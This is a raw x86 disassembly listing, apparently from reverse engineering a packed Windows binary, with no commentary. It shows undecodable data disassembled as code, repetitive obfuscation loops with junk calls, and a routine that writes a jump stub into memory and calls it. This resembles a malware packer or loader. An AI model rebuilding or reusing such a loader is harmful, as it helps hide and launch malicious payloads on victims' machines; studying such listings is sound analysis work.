  416b09:	xchg   ecx,eax
  416b0a:	push   ebp
  416b0b:	(bad)  
  416b0c:	into   
  416b0d:	aaa    
  416b0e:	and    eax,edi
  416b10:	cmp    BYTE PTR [edi+0x22],ch
  416b13:	push   0xffffff8f
  416b15:	rcl    DWORD PTR [edx],0x2f
  416b18:	repnz add BYTE PTR ds:0xa998f49a,ch
  416b1f:	fdivrp st(0),st
  416b21:	inc    edx
  416b22:	pop    ds
  416b23:	add    ebp,ebx
  416b25:	xchg   edx,eax
  416b26:	popf   
  416b27:	mov    al,0x68
  416b29:	pop    ecx
  416b2a:	inc    ebp
  416b2b:	jb     0x416b4f
  416b2d:	into   
  416b2e:	loop   0x416b42
  416b30:	add    WORD PTR [edi],bx
  416b33:	fstp   TBYTE PTR [edx]
  416b35:	je     0x416b0d
  416b37:	cmp    ah,dl
  416b39:	mov    dh,0xa4
  416b3b:	clts   
  416b3d:	and    dh,BYTE PTR [esi-0x7e67b154]
  416b43:	rcl    BYTE PTR [ecx],0x1f
  416b46:	scas   eax,DWORD PTR es:[edi]
  416b47:	and    al,0x81
  416b49:	xchg   ebp,eax
  416b4a:	ss jb  0x416b84
  416b4d:	mov    eax,0x8c9143c9
  416b52:	rol    bl,cl
  416b54:	xchg   ebp,eax
  416b55:	adc    al,bh
  416b57:	fild   QWORD PTR [di+0x7c2a]
  416b5c:	pop    esp
  416b5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b5e:	aaa    
  416b5f:	fdiv   QWORD PTR [ecx]
  416b61:	xor    eax,edi
  416b63:	es push cs
  416b65:	adc    eax,0xc6e9d0fb
  416b6a:	popa   
  416b6b:	add    bl,al
  416b6d:	and    ebx,ebx
  416b6f:	fld    DWORD PTR [eax]
  416b71:	loopne 0x416bbc
  416b73:	push   0xffffffdc
  416b75:	jae    0x416b51
  416b77:	jnp    0x416b89
  416b79:	sar    DWORD PTR [eax+0x610b2238],0xac
  416b80:	adc    DWORD PTR [edi],ebp
  416b82:	adc    al,0xc3
  416b84:	ins    DWORD PTR es:[edi],dx
  416b85:	sbb    al,0x9f
  416b87:	pusha  
  416b88:	dec    ebx
  416b89:	pop    edx
  416b8a:	inc    DWORD PTR [ecx-0x321ea754]
  416b90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b91:	cmp    edi,ebp
  416b93:	xchg   ebx,eax
  416b94:	pop    esp
  416b95:	popf   
  416b96:	add    eax,0x20cf5843
  416b9b:	sahf   
  416b9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b9e:	inc    edx
  416b9f:	adc    al,BYTE PTR [ebx]
  416ba1:	popa   
  416ba2:	bound  edi,QWORD PTR [edi+0x4b51c5a]
  416ba8:	dec    eax
  416ba9:	cli    
  416baa:	inc    ecx
  416bab:	cli    
  416bac:	xlat   BYTE PTR ss:[ebx]
  416bae:	jns    0x416bd0
  416bb0:	mov    WORD PTR [eax],ss
  416bb2:	popa   
  416bb3:	popf   
  416bb4:	hlt    
  416bb5:	or     DWORD PTR [edx-0x1a],esi
  416bb8:	int3   
  416bb9:	aaa    
  416bba:	rcl    ch,0x3b
  416bbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bbe:	mov    ebp,0x6997d1ab
  416bc3:	inc    eax
  416bc4:	adc    eax,0x33
  416bc7:	out    0x1,al
  416bc9:	scas   al,BYTE PTR es:[edi]
  416bca:	(bad)  
  416bcb:	out    dx,al
  416bcc:	mov    bl,0x40
  416bce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bcf:	out    dx,eax
  416bd0:	popa   
  416bd1:	adc    esp,DWORD PTR [eax]
  416bd3:	idiv   BYTE PTR [ecx-0x24]
  416bd6:	push   es
  416bd7:	loopne 0x416bf6
  416bd9:	push   0x65
  416bdb:	sub    BYTE PTR [esi+0x29086fa4],cl
  416be1:	xchg   BYTE PTR [edi],dh
  416be3:	add    DWORD PTR [ecx-0x750b6ef],edi
  416be9:	xor    ecx,DWORD PTR [ebp+0x30]
  416bec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bed:	(bad)  
  416bef:	fcom   DWORD PTR [edx+0x3dc35e2d]
  416bf5:	loope  0x416c13
  416bf7:	pop    ds
  416bf8:	rcl    BYTE PTR [ebp-0x443afbc6],cl
  416bfe:	jbe    0x416bf7
  416c00:	das    
  416c01:	div    BYTE PTR [eax+0x3e1e81e9]
  416c07:	stos   BYTE PTR es:[edi],al
  416c08:	sub    BYTE PTR [ebp-0x78e25909],bh
  416c0e:	dec    edx
  416c0f:	daa    
  416c10:	inc    ebp
  416c11:	or     eax,edi
  416c13:	fs jnp 0x416c19
  416c16:	sbb    BYTE PTR [ebp-0x11979dd9],bl
  416c1c:	sbb    bh,BYTE PTR [edi+0x11831b28]
  416c22:	ret    
  416c23:	mov    DWORD PTR [edx],esp
  416c25:	test   DWORD PTR [esi],ebp
  416c27:	stc    
  416c28:	adc    BYTE PTR [esi-0x64f7ba62],dl
  416c2e:	push   0x97d1f1d6
  416c33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c34:	mov    edx,0x3e420fa1
  416c39:	retf   0x8a7e
  416c3c:	push   ebp
  416c3d:	jmp    0x9304:0x80159de7
  416c44:	cmc    
  416c45:	jmp    0x734d8c49
  416c4a:	mov    esp,0x4d0d860a
  416c4f:	stos   DWORD PTR es:[edi],eax
  416c50:	lea    ecx,[esp+esi*8]
  416c53:	in     al,dx
  416c54:	mov    al,0x13
  416c56:	jecxz  0x416bda
  416c58:	inc    ebp
  416c59:	jbe    0x416c35
  416c5b:	dec    ebp
  416c5c:	out    dx,eax
  416c5d:	dec    esi
  416c5e:	and    BYTE PTR [edi-0x6f],dh
  416c61:	icebp  
  416c62:	xchg   BYTE PTR ds:[edx],dh
  416c65:	ins    DWORD PTR es:[edi],dx
  416c66:	dec    ebx
  416c67:	addr16 and eax,0x34e9c4a8
  416c6d:	jmp    0x44a26a2b
  416c72:	and    cl,ch
  416c74:	das    
  416c75:	jnp    0x416c67
  416c77:	retf   
  416c78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c79:	ficomp DWORD PTR [esi-0x71]
  416c7c:	and    ebp,DWORD PTR [edx]
  416c7e:	inc    esp
  416c7f:	iret   
  416c80:	or     DWORD PTR [eax+ebp*2-0x2982f01b],esi
  416c87:	sub    eax,0xd26cbe5c
  416c8c:	cmp    dl,ah
  416c8e:	les    esp,FWORD PTR [eax-0x49]
  416c91:	dec    ebx
  416c92:	aad    0x14
  416c94:	sub    al,0x47
  416c96:	mov    bh,0x6d
  416c98:	fld    TBYTE PTR [esi]
  416c9a:	out    0xa3,eax
  416c9c:	lea    eax,[edi]
  416c9e:	sbb    ah,bh
  416ca0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ca1:	mov    eax,0x80f8fb35
  416ca6:	inc    esi
  416ca7:	jnp    0x416c47
  416ca9:	clc    
  416caa:	cld    
  416cab:	sub    DWORD PTR [esi+0x11f2f332],esi
  416cb1:	mov    cl,BYTE PTR [eax-0x4259ce2d]
  416cb7:	pop    ecx
  416cb8:	ficomp DWORD PTR [ebx]
  416cba:	js     0x416ce8
  416cbc:	adc    al,0x13
  416cbe:	repnz push es
  416cc0:	es (bad) 
  416cc2:	not    BYTE PTR [edi+0x57]
  416cc5:	sub    BYTE PTR [eax],dh
  416cc7:	(bad)  
  416cc8:	shrd   ebx,edi,cl
  416ccb:	or     dl,BYTE PTR [esi+0x1]
  416cce:	adc    al,0x27
  416cd0:	mov    ds:0x33f85d8b,eax
  416cd5:	shl    BYTE PTR [ebx],1
  416cd7:	fsubr  DWORD PTR [ebx]
  416cd9:	shr    DWORD PTR [ebx],cl
  416cdb:	(bad)  
  416cdc:	xor    edx,eax
  416cde:	mov    DWORD PTR [ebp+0x8],edx
  416ce1:	mov    edx,DWORD PTR [ebp+0x8]
  416ce4:	mov    ebx,DWORD PTR [ebp-0x58]
  416ce7:	lea    edx,[ebx+edx*1+0x5708f4]
  416cee:	mov    DWORD PTR [ebp-0x58],edx
  416cf1:	mov    edx,DWORD PTR [ebp+0x8]
  416cf4:	mov    ebx,DWORD PTR [ebp-0x54]
  416cf7:	add    edx,0x64f89a
  416cfd:	imul   edx,ebx
  416d00:	mov    DWORD PTR [ebp-0x54],edx
  416d03:	mov    edx,DWORD PTR [ebp+0x8]
  416d06:	mov    ebx,DWORD PTR [ebp-0x50]
  416d09:	add    edx,0x242ebe9
  416d0f:	and    edx,ebx
  416d11:	mov    DWORD PTR [ebp-0x50],edx
  416d14:	mov    edx,DWORD PTR [ebp+0x8]
  416d17:	mov    ebx,DWORD PTR [ebp-0x4c]
  416d1a:	add    edx,ecx
  416d1c:	or     edx,ebx
  416d1e:	mov    DWORD PTR [ebp-0x4c],edx
  416d21:	mov    edx,DWORD PTR [ebp+0x8]
  416d24:	mov    ebx,0xfdbe0321
  416d29:	sub    ebx,edx
  416d2b:	add    ebx,DWORD PTR [ebp-0x48]
  416d2e:	mov    DWORD PTR [ebp-0x48],ebx
  416d31:	mov    edx,DWORD PTR [ebp+0x8]
  416d34:	mov    ebx,DWORD PTR [ebp-0x44]
  416d37:	add    edx,edi
  416d39:	xor    edx,ebx
  416d3b:	mov    DWORD PTR [ebp-0x44],edx
  416d3e:	mov    edx,DWORD PTR [ebp+0x8]
  416d41:	xor    edx,eax
  416d43:	add    edx,esi
  416d45:	jne    0x41497b
  416d4b:	jmp    0x416dd8
  416d50:	mov    edx,DWORD PTR [ebp-0x14]
  416d53:	mov    DWORD PTR [ebp+0x8],edx
  416d56:	jmp    0x416dcb
  416d5b:	mov    edx,DWORD PTR [ebp+0x8]
  416d5e:	mov    ebx,DWORD PTR [ebp-0x8]
  416d61:	xor    edx,eax
  416d63:	xor    ebx,eax
  416d65:	sub    edx,ebx
  416d67:	sub    edx,esi
  416d69:	xor    edx,eax
  416d6b:	mov    DWORD PTR [ebp+0x8],edx
  416d6e:	mov    edx,DWORD PTR [ebp+0x8]
  416d71:	mov    ebx,DWORD PTR [ebp-0x58]
  416d74:	lea    edx,[ebx+edx*1+0x5708f4]
  416d7b:	mov    DWORD PTR [ebp-0x58],edx
  416d7e:	mov    edx,DWORD PTR [ebp+0x8]
  416d81:	mov    ebx,DWORD PTR [ebp-0x54]
  416d84:	add    edx,0x64f89a
  416d8a:	imul   edx,ebx
  416d8d:	mov    DWORD PTR [ebp-0x54],edx
  416d90:	mov    edx,DWORD PTR [ebp+0x8]
  416d93:	mov    ebx,DWORD PTR [ebp-0x50]
  416d96:	add    edx,0x242ebe9
  416d9c:	and    edx,ebx
  416d9e:	mov    DWORD PTR [ebp-0x50],edx
  416da1:	mov    edx,DWORD PTR [ebp+0x8]
  416da4:	mov    ebx,DWORD PTR [ebp-0x4c]
  416da7:	add    edx,ecx
  416da9:	or     edx,ebx
  416dab:	mov    DWORD PTR [ebp-0x4c],edx
  416dae:	mov    edx,DWORD PTR [ebp+0x8]
  416db1:	mov    ebx,0xfdbe0321
  416db6:	sub    ebx,edx
  416db8:	add    ebx,DWORD PTR [ebp-0x48]
  416dbb:	mov    DWORD PTR [ebp-0x48],ebx
  416dbe:	mov    edx,DWORD PTR [ebp+0x8]
  416dc1:	mov    ebx,DWORD PTR [ebp-0x44]
  416dc4:	add    edx,edi
  416dc6:	xor    edx,ebx
  416dc8:	mov    DWORD PTR [ebp-0x44],edx
  416dcb:	mov    edx,DWORD PTR [ebp+0x8]
  416dce:	xor    edx,eax
  416dd0:	add    edx,esi
  416dd2:	jne    0x416d5b
  416dd8:	mov    edx,DWORD PTR [ebp-0x14]
  416ddb:	mov    DWORD PTR [ebp+0x8],edx
  416dde:	jmp    0x416e53
  416de3:	mov    edx,DWORD PTR [ebp+0x8]
  416de6:	mov    ebx,DWORD PTR [ebp-0x8]
  416de9:	xor    edx,eax
  416deb:	xor    ebx,eax
  416ded:	sub    edx,ebx
  416def:	sub    edx,esi
  416df1:	xor    edx,eax
  416df3:	mov    DWORD PTR [ebp+0x8],edx
  416df6:	mov    edx,DWORD PTR [ebp+0x8]
  416df9:	mov    ebx,DWORD PTR [ebp-0x58]
  416dfc:	lea    edx,[ebx+edx*1+0x5708f4]
  416e03:	mov    DWORD PTR [ebp-0x58],edx
  416e06:	mov    edx,DWORD PTR [ebp+0x8]
  416e09:	mov    ebx,DWORD PTR [ebp-0x54]
  416e0c:	add    edx,0x64f89a
  416e12:	imul   edx,ebx
  416e15:	mov    DWORD PTR [ebp-0x54],edx
  416e18:	mov    edx,DWORD PTR [ebp+0x8]
  416e1b:	mov    ebx,DWORD PTR [ebp-0x50]
  416e1e:	add    edx,0x242ebe9
  416e24:	and    edx,ebx
  416e26:	mov    DWORD PTR [ebp-0x50],edx
  416e29:	mov    edx,DWORD PTR [ebp+0x8]
  416e2c:	mov    ebx,DWORD PTR [ebp-0x4c]
  416e2f:	add    edx,ecx
  416e31:	or     edx,ebx
  416e33:	mov    DWORD PTR [ebp-0x4c],edx
  416e36:	mov    edx,DWORD PTR [ebp+0x8]
  416e39:	mov    ebx,0xfdbe0321
  416e3e:	sub    ebx,edx
  416e40:	add    ebx,DWORD PTR [ebp-0x48]
  416e43:	mov    DWORD PTR [ebp-0x48],ebx
  416e46:	mov    edx,DWORD PTR [ebp+0x8]
  416e49:	mov    ebx,DWORD PTR [ebp-0x44]
  416e4c:	add    edx,edi
  416e4e:	xor    edx,ebx
  416e50:	mov    DWORD PTR [ebp-0x44],edx
  416e53:	mov    edx,DWORD PTR [ebp+0x8]
  416e56:	xor    edx,eax
  416e58:	add    edx,esi
  416e5a:	jne    0x416de3
  416e60:	mov    edx,DWORD PTR [ebp-0x8]
  416e63:	mov    ebx,DWORD PTR [ebp-0xc]
  416e66:	xor    edx,eax
  416e68:	lea    edx,[edx+ebx*1+0x3272fa]
  416e6f:	mov    DWORD PTR [ebp-0xc],edx
  416e72:	mov    edx,DWORD PTR [ebp-0x10]
  416e75:	xor    edx,eax
  416e77:	add    edx,esi
  416e79:	jne    0x412518
  416e7f:	jmp    0x416f96
  416e84:	mov    ecx,DWORD PTR [ebp-0x14]
  416e87:	mov    DWORD PTR [ebp+0x8],ecx
  416e8a:	jmp    0x416f03
  416e8f:	mov    ecx,DWORD PTR [ebp+0x8]
  416e92:	mov    edx,DWORD PTR [ebp-0x8]
  416e95:	xor    ecx,eax
  416e97:	xor    edx,eax
  416e99:	sub    ecx,edx
  416e9b:	sub    ecx,esi
  416e9d:	xor    ecx,eax
  416e9f:	mov    DWORD PTR [ebp+0x8],ecx
  416ea2:	mov    ecx,DWORD PTR [ebp+0x8]
  416ea5:	mov    edx,DWORD PTR [ebp-0x58]
  416ea8:	lea    ecx,[edx+ecx*1+0x5708f4]
  416eaf:	mov    DWORD PTR [ebp-0x58],ecx
  416eb2:	mov    ecx,DWORD PTR [ebp+0x8]
  416eb5:	mov    edx,DWORD PTR [ebp-0x54]
  416eb8:	add    ecx,0x64f89a
  416ebe:	imul   ecx,edx
  416ec1:	mov    DWORD PTR [ebp-0x54],ecx
  416ec4:	mov    ecx,DWORD PTR [ebp+0x8]
  416ec7:	mov    edx,DWORD PTR [ebp-0x50]
  416eca:	add    ecx,0x242ebe9
  416ed0:	and    ecx,edx
  416ed2:	mov    DWORD PTR [ebp-0x50],ecx
  416ed5:	mov    ecx,DWORD PTR [ebp+0x8]
  416ed8:	mov    edx,DWORD PTR [ebp-0x4c]
  416edb:	add    ecx,0xf641bea
  416ee1:	or     ecx,edx
  416ee3:	mov    DWORD PTR [ebp-0x4c],ecx
  416ee6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ee9:	mov    edx,0xfdbe0321
  416eee:	sub    edx,ecx
  416ef0:	add    edx,DWORD PTR [ebp-0x48]
  416ef3:	mov    DWORD PTR [ebp-0x48],edx
  416ef6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ef9:	mov    edx,DWORD PTR [ebp-0x44]
  416efc:	add    ecx,edi
  416efe:	xor    ecx,edx
  416f00:	mov    DWORD PTR [ebp-0x44],ecx
  416f03:	mov    ecx,DWORD PTR [ebp+0x8]
  416f06:	xor    ecx,eax
  416f08:	add    ecx,esi
  416f0a:	jne    0x416e8f
  416f10:	jmp    0x416fa2
  416f15:	mov    ecx,DWORD PTR [ebp+0x8]
  416f18:	mov    edx,DWORD PTR [ebp-0x8]
  416f1b:	xor    ecx,eax
  416f1d:	xor    edx,eax
  416f1f:	sub    ecx,edx
  416f21:	sub    ecx,esi
  416f23:	xor    ecx,eax
  416f25:	mov    DWORD PTR [ebp+0x8],ecx
  416f28:	mov    ecx,DWORD PTR [ebp+0x8]
  416f2b:	mov    edx,DWORD PTR [ebp-0x58]
  416f2e:	lea    ecx,[edx+ecx*1+0x5708f4]
  416f35:	mov    DWORD PTR [ebp-0x58],ecx
  416f38:	mov    ecx,DWORD PTR [ebp+0x8]
  416f3b:	mov    edx,DWORD PTR [ebp-0x54]
  416f3e:	add    ecx,0x64f89a
  416f44:	imul   ecx,edx
  416f47:	mov    DWORD PTR [ebp-0x54],ecx
  416f4a:	mov    ecx,DWORD PTR [ebp+0x8]
  416f4d:	mov    edx,DWORD PTR [ebp-0x50]
  416f50:	add    ecx,0x242ebe9
  416f56:	and    ecx,edx
  416f58:	mov    DWORD PTR [ebp-0x50],ecx
  416f5b:	mov    ecx,DWORD PTR [ebp+0x8]
  416f5e:	mov    edx,DWORD PTR [ebp-0x4c]
  416f61:	add    ecx,0xf641bea
  416f67:	or     ecx,edx
  416f69:	mov    DWORD PTR [ebp-0x4c],ecx
  416f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f6f:	mov    edx,0xfdbe0321
  416f74:	sub    edx,ecx
  416f76:	add    edx,DWORD PTR [ebp-0x48]
  416f79:	mov    DWORD PTR [ebp-0x48],edx
  416f7c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f7f:	mov    edx,DWORD PTR [ebp-0x44]
  416f82:	add    ecx,edi
  416f84:	xor    ecx,edx
  416f86:	mov    DWORD PTR [ebp-0x44],ecx
  416f89:	mov    ecx,DWORD PTR [ebp+0x8]
  416f8c:	xor    ecx,eax
  416f8e:	add    ecx,esi
  416f90:	jne    0x416f15
  416f96:	mov    ecx,DWORD PTR [ebp-0x8]
  416f99:	xor    ecx,eax
  416f9b:	mov    eax,DWORD PTR [ebp+0x10]
  416f9e:	add    ecx,esi
  416fa0:	mov    DWORD PTR [eax],ecx
  416fa2:	pop    edi
  416fa3:	pop    esi
  416fa4:	pop    ebx
  416fa5:	leave  
  416fa6:	ret    0xc
  416fa9:	push   ebp
  416faa:	mov    ebp,esp
  416fac:	sub    esp,0x78
  416faf:	add    DWORD PTR ds:0x426f25,0x66eb
  416fb9:	push   esi
  416fba:	mov    esi,DWORD PTR ds:0x426f55
  416fc0:	mov    eax,ds:0x428d01
  416fc5:	sub    eax,esi
  416fc7:	imul   esi,DWORD PTR [esi+eax*1]
  416fcb:	push   edi
  416fcc:	xor    esi,esi
  416fce:	or     esi,DWORD PTR ds:0x42af65
  416fd4:	mov    esi,DWORD PTR [esi]
  416fd6:	sbb    DWORD PTR ds:0x426e8d,esi
  416fdc:	mov    eax,ds:0x4262c9
  416fe1:	mov    DWORD PTR [ebp-0x24],eax
  416fe4:	and    DWORD PTR ds:0x426eb9,0x0
  416fee:	mov    esi,DWORD PTR ds:0x426eb9
  416ff4:	inc    esi
  416ff5:	mov    DWORD PTR ds:0x426eb9,esi
  416ffb:	cmp    DWORD PTR ds:0x426eb9,0x4
  417002:	jbe    0x41703f
  417008:	jmp    0x417018
  41700d:	push   0x2f87
  417012:	call   DWORD PTR ds:0x430a2c
  417018:	cmp    DWORD PTR ds:0x426eb9,0x3
  41701f:	jne    0x417032
  417025:	mov    esi,DWORD PTR ds:0x426eb9
  41702b:	inc    esi
  41702c:	mov    DWORD PTR ds:0x426eb9,esi
  417032:	cmp    DWORD PTR ds:0x426eb9,0x19
  417039:	jb     0x416fee
  41703f:	mov    eax,ds:0x4263e9
  417044:	mov    DWORD PTR [ebp-0x30],eax
  417047:	sub    esi,esi
  417049:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  417050:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
  417057:	and    DWORD PTR ds:0x426ec1,0x0
  417061:	jmp    0x417074
  417066:	xor    eax,eax
  417068:	add    eax,DWORD PTR ds:0x426ec1
  41706e:	inc    eax
  41706f:	mov    ds:0x426ec1,eax
  417074:	cmp    DWORD PTR ds:0x426ec1,0x13
  41707b:	jae    0x4170b9
  417081:	cmp    DWORD PTR ds:0x426ec1,0x5
  417088:	jg     0x4170b9
  41708e:	jmp    0x417099
  417093:	call   DWORD PTR ds:0x430a00
  417099:	cmp    DWORD PTR ds:0x426ec1,0x4
  4170a0:	jne    0x4170b4
  4170a6:	xor    eax,eax
  4170a8:	xor    eax,DWORD PTR ds:0x426ec1
  4170ae:	inc    eax
  4170af:	mov    ds:0x426ec1,eax
  4170b4:	jmp    0x417066
  4170b9:	mov    eax,DWORD PTR [ebp-0x10]
  4170bc:	mov    ecx,DWORD PTR [ebp-0x10]
  4170bf:	sub    eax,ecx
  4170c1:	mov    ecx,DWORD PTR ds:0x428d0d
  4170c7:	mov    ecx,DWORD PTR [ecx]
  4170c9:	and    DWORD PTR ds:0x426ed5,ecx
  4170cf:	mov    DWORD PTR [ebp-0x10],eax
  4170d2:	and    DWORD PTR ds:0x426ec1,0x0
  4170dc:	xor    ecx,ecx
  4170de:	or     ecx,DWORD PTR ds:0x426ec1
  4170e4:	inc    ecx
  4170e5:	mov    DWORD PTR ds:0x426ec1,ecx
  4170eb:	cmp    DWORD PTR ds:0x426ec1,0x8
  4170f2:	ja     0x417153
  4170f8:	jmp    0x41712c
  4170fd:	push   0x4411
  417102:	push   DWORD PTR [ebp-0x28]
  417105:	push   0x7cba
  41710a:	push   0x1619
  41710f:	push   DWORD PTR [ebp-0x28]
  417112:	push   0x5e18
  417117:	push   0x6c27
  41711c:	push   0x15fe
  417121:	push   0x4181
  417126:	call   DWORD PTR ds:0x430a04
  41712c:	cmp    DWORD PTR ds:0x426ec1,0x7
  417133:	jne    0x417146
  417139:	mov    ecx,DWORD PTR ds:0x426ec1
  41713f:	inc    ecx
  417140:	mov    DWORD PTR ds:0x426ec1,ecx
  417146:	cmp    DWORD PTR ds:0x426ec1,0x1b
  41714d:	jb     0x4170dc
  417153:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  41715a:	mov    edi,DWORD PTR ds:0x426e95
  417160:	xor    DWORD PTR ds:0x426e91,edi
  417166:	mov    eax,DWORD PTR [ebp-0x18]
  417169:	mov    DWORD PTR ds:0x426e89,0x1f
  417173:	cmp    DWORD PTR ds:0x426e89,0x0
  41717a:	je     0x4171aa
  417180:	cmp    DWORD PTR ds:0x426e89,0x28
  417187:	jg     0x4171aa
  41718d:	jmp    0x417198
  417192:	call   DWORD PTR ds:0x430a38
  417198:	mov    esi,DWORD PTR ds:0x426e89
  41719e:	dec    esi
  41719f:	mov    DWORD PTR ds:0x426e89,esi
  4171a5:	jmp    0x417173
  4171aa:	mov    ecx,DWORD PTR [ebp-0x18]
  4171ad:	sbb    DWORD PTR ds:0x426e91,ebx
  4171b3:	sub    eax,ecx
  4171b5:	mov    DWORD PTR [ebp-0x18],eax
  4171b8:	sbb    ecx,DWORD PTR ds:0x426ed5
  4171be:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  4171c5:	mov    eax,DWORD PTR [ebp-0xc]
  4171c8:	mov    ecx,DWORD PTR [ebp-0xc]
  4171cb:	adc    DWORD PTR ds:0x426eed,0xa48
  4171d5:	sub    eax,ecx
  4171d7:	mov    DWORD PTR [ebp-0xc],eax
  4171da:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  4171e1:	mov    DWORD PTR ds:0x426eb9,0x1e
  4171eb:	cmp    DWORD PTR ds:0x426eb9,0x0
  4171f2:	je     0x417222
  4171f8:	cmp    DWORD PTR ds:0x426eb9,0x24
  4171ff:	jb     0x417222
  417205:	jmp    0x417210
  41720a:	call   DWORD PTR ds:0x430a08
  417210:	mov    esi,DWORD PTR ds:0x426eb9
  417216:	dec    esi
  417217:	mov    DWORD PTR ds:0x426eb9,esi
  41721d:	jmp    0x4171eb
  417222:	mov    eax,DWORD PTR [ebp-0x1c]
  417225:	mov    ecx,DWORD PTR [ebp-0x1c]
  417228:	sub    eax,ecx
  41722a:	mov    DWORD PTR [ebp-0x1c],eax
  41722d:	or     DWORD PTR [ebp-0x1c],0xf89c8595
  417234:	mov    eax,DWORD PTR [ebp-0x20]
  417237:	mov    ecx,DWORD PTR [ebp-0x20]
  41723a:	sub    eax,ecx
  41723c:	mov    DWORD PTR [ebp-0x20],eax
  41723f:	mov    eax,DWORD PTR [ebp-0x2c]
  417242:	mov    ecx,DWORD PTR [ebp-0x20]
  417245:	mov    esi,0x75108b3
  41724a:	xor    eax,esi
  41724c:	mov    edi,0x3272fa
  417251:	add    eax,edi
  417253:	or     eax,ecx
  417255:	mov    DWORD PTR [ebp-0x20],eax
  417258:	mov    eax,DWORD PTR [ebp-0x4]
  41725b:	mov    ecx,DWORD PTR [ebp-0x4]
  41725e:	sub    eax,ecx
  417260:	mov    DWORD PTR [ebp-0x4],eax
  417263:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  41726a:	mov    eax,DWORD PTR [ebp-0xc]
  41726d:	xor    eax,esi
  41726f:	add    eax,edi
  417271:	push   eax
  417272:	mov    eax,DWORD PTR [ebp-0x10]
  417275:	xor    eax,esi
  417277:	add    eax,edi
  417279:	push   eax
  41727a:	mov    eax,DWORD PTR [ebp-0x4]
  41727d:	xor    eax,esi
  41727f:	add    eax,0x3272fe
  417284:	push   eax
  417285:	lea    eax,[ebp-0x78]
  417288:	push   eax
  417289:	push   DWORD PTR [ebp-0x2c]
  41728c:	push   DWORD PTR [ebp-0x28]
  41728f:	call   0x40d3b8
  417294:	test   eax,eax
  417296:	je     0x4172c4
  41729c:	lea    eax,[ebp-0x78]
  41729f:	push   eax
  4172a0:	mov    eax,DWORD PTR [ebp-0x28]
  4172a3:	xor    eax,esi
  4172a5:	add    eax,edi
  4172a7:	push   eax
  4172a8:	mov    eax,DWORD PTR [ebp-0x24]
  4172ab:	add    eax,0xaa
  4172b0:	push   eax
  4172b1:	mov    eax,DWORD PTR [ebp-0x24]
  4172b4:	mov    eax,DWORD PTR [eax+0x198]
  4172ba:	push   DWORD PTR [eax]
  4172bc:	call   0x408594
  4172c1:	mov    DWORD PTR [ebp-0x14],eax
  4172c4:	mov    ecx,DWORD PTR ds:0x4263c1
  4172ca:	lea    eax,[ebp+0x4]
  4172cd:	mov    DWORD PTR [ecx*4+0x4263b9],eax
  4172d4:	inc    DWORD PTR ds:0x4263c1
  4172da:	mov    eax,DWORD PTR [ebp-0x14]
  4172dd:	test   eax,eax
  4172df:	je     0x417351
  4172e5:	lea    eax,[ebp-0x8]
  4172e8:	mov    DWORD PTR [ebp-0x34],eax
  4172eb:	mov    eax,DWORD PTR [ebp-0x30]
  4172ee:	mov    DWORD PTR [ebp-0x8],eax
  4172f1:	mov    eax,DWORD PTR [ebp-0x8]
  4172f4:	mov    ecx,DWORD PTR [ebp-0x14]
  4172f7:	sub    eax,ecx
  4172f9:	mov    DWORD PTR [ebp-0x8],eax
  4172fc:	mov    ecx,DWORD PTR [ebp-0x4]
  4172ff:	xor    ecx,esi
  417301:	mov    eax,0xffcd8d06
  417306:	sub    eax,ecx
  417308:	add    DWORD PTR [ebp-0x8],eax
  41730b:	mov    eax,DWORD PTR [ebp-0x14]
  41730e:	mov    DWORD PTR [eax],0x675565e9
  417314:	mov    DWORD PTR [eax+0x4],0x76576787
  41731b:	mov    eax,DWORD PTR [ebp-0x8]
  41731e:	mov    ecx,DWORD PTR [ebp-0x14]
  417321:	push   DWORD PTR [ebp-0x24]
  417324:	mov    DWORD PTR [ecx+0x1],eax
  417327:	mov    eax,ds:0x426145
  41732c:	push   DWORD PTR [eax]
  41732e:	push   DWORD PTR ds:0x4263a9
  417334:	push   DWORD PTR ds:0x42614d
  41733a:	push   DWORD PTR ds:0x426389
  417340:	push   DWORD PTR ds:0x426cc9
  417346:	push   DWORD PTR [ebp-0x28]
  417349:	push   DWORD PTR [ebp-0x2c]
  41734c:	mov    eax,DWORD PTR [ebp-0x14]
  41734f:	call   eax
  417351:	pop    edi
  417352:	pop    esi
  417353:	leave  
  417354:	ret    
  417355:	push   ebp
  417356:	mov    ebp,esp
  417358:	sub    esp,0x34
  41735b:	neg    edx
  41735d:	push   ebx
  41735e:	adc    edx,ecx
  417360:	push   esi
  417361:	push   edi
  417362:	xor    ecx,0x2a8a
  417368:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  41736f:	mov    edx,DWORD PTR ds:0x429d61
  417375:	xor    esi,esi
  417377:	xor    esi,DWORD PTR ds:0x429d75
  41737d:	sub    esi,edx
  41737f:	add    edx,DWORD PTR [edx+esi*1]
  417382:	lea    eax,[ebp+0x14]
  417385:	sub    ecx,0x2a97
  41738b:	mov    DWORD PTR [ebp-0x4],eax
  41738e:	sub    DWORD PTR ds:0x426e8d,0x3cd0
  417398:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  41739f:	xor    DWORD PTR ds:0x426ea1,ebx
  4173a5:	lea    eax,[ebp-0xc]
  4173a8:	add    esi,ecx
  4173aa:	mov    DWORD PTR [ebp-0x14],eax
  4173ad:	xor    DWORD PTR ds:0x426f29,ecx
  4173b3:	mov    eax,DWORD PTR [ebp-0xc]
  4173b6:	or     ecx,edx
